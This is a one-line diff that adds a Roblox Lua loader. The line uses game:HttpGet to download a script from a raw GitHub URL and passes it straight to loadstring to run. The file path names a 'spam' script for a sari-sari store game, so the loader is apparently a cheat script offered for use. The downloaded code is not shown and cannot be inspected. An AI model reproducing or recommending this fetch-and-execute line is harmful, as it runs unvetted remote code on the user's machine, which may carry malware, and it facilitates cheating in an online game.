@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/run-a-sari-sari-store-spam6-6l3c2opyoc22zp.lua"))()
